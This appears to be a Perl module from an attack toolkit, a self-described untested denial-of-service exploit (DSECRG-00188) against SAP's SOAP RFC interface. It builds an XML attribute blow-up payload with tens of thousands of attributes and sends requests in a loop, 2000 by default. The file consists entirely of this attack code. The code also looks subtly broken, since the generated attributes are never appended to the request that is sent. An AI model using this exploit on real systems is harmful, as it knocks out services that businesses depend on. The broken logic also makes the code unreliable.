#!/usr/bin/perl
# Module SOAP XRFC DoS Exploit 	[DSECRG-00188] 

# CONFIG
######################
my $desc ="!UNTESTED!SOAP XRFC DoS Exploit 'XML Attribute Blow-up attack' [DSECRG-00188]  \n\t Usage: black.pl .. .. -m id_module <num> - packet count, default is 2000\n"; 
our $funcName="soap_attrib_blowup_DOS";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub soap_attrib_blowup_DOS()
{
	my $XML="<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">"."<SOAP-ENV:Body>\r\n"."<m:RFC_PING xmlns:m=\"urn:sap-com:document:sap:rfc:functions\" ";

	$var="=\"aaaaaaaaa\"";
	$vr='a';
	$ret="";

	for($i=0;$i<0x8100;$i++){
		$content.= $vr.$tmp.$var." ";
		$tmp++;
		}

	$content.="></m:RFC_PING>\r\n"."</SOAP-ENV:Body>"."</SOAP-ENV:Envelope>\r\n\r\n";

	if ($ARGV[$m_arg_i+1]){
		$num=$ARGV[$m_arg_i+1];
		print $num." - num \n\n";
	} else {
		$num=2000;
	}
	
	
	print "Start DoS!\n";
	for (my $i=0;$i<$num;$i++)
	{
		send_soap($XML,0);
		$prc = int($i*100/$num);
		
		if(($prc%10)==0)
			{ print "$prc% - Done! ($i-$num)\n"; };
	}
	
	print "\n";
	
	
	

}